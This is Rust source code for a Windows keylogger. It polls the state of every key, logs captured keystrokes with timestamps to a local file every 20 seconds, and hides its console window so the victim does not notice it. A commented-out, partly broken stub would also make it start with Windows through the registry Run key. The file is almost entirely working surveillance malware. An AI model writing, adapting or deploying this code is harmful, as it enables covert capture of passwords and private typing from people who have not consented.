extern crate winapi;
extern crate user32;
extern crate kernel32;

use std::{thread, time};
use std::io::prelude::*;
use std::fs::OpenOptions;
use std::env;

const LOG_FILE: &str = "records.data";
const LOG_AFTER: u64 = 20; // sec

fn timestamp() -> u64 {
	match time::SystemTime::now().duration_since(time::UNIX_EPOCH) {
		Ok(result) => result.as_secs(),
		Err(_) => 0
	}
}

fn write(stamp: u64, content: &Vec<i32>) {
	let file = OpenOptions::new().create(true).append(true).open(LOG_FILE);
	match file {
		Ok(file) => {
			let err = writeln!(&file, "{:?}:{:?}", stamp, &content);
			if let Err(e) = err {
        		println!("{:?}", e);
    		}			
		},
		Err(e) => {
			println!("{:?}", e);
		},
	}
}

fn start_logger(){
	let mut start = timestamp();
	let mut collection = vec![(1 as i32)];

	loop {
		thread::sleep(time::Duration::from_millis(10));
		for i in 1..256 {
			if unsafe { user32::GetAsyncKeyState(i) } == -32767 {
				collection.push(i);
			}

			// log to file after specified time 
			let current_time = timestamp();
			if !collection.is_empty() && (start + LOG_AFTER) < current_time{
				write(start, &collection);
				collection.clear();
				start = current_time;
			}
		}
	}
}

fn stealth(){
	let title = std::ffi::CString::new("keylogger").unwrap();
	unsafe{
		// do we need this ?
		kernel32::SetConsoleTitleA(title.as_ptr());
		kernel32::AllocConsole();
		let win = user32::FindWindowA(std::ptr::null_mut(), title.as_ptr());
        user32::ShowWindow(win, 0);   
	}
}

// fn auto_start_enable(){
// 	let progPath = "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\MyApp.exe";
// 	let key = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
// 	let hkey = std::ptr::null_mut();
// 	let createStatus = kernel32::RegCreateKey(user32::HKEY_CURRENT_USER, L, &hkey); 
// 	let status = kernel32::RegSetValueEx(hkey, "MyApp", 0, REG_SZ, (BYTE *)progPath.c_str(), (progPath.size()+1) * sizeof(wchar_t));
// }



fn main() {
	let args: Vec<String> = env::args().collect();
	match args.get(1) {
		Some(param) => {
			if param != "--register" {
		 		return println!("{:?}", "invalid argument.");		 		
		 	}   

		 	// auto_start_enable();

		 	println!("{:?}", "register");
	 	},
		None => {
			stealth();
			start_logger();
		},
	}
}
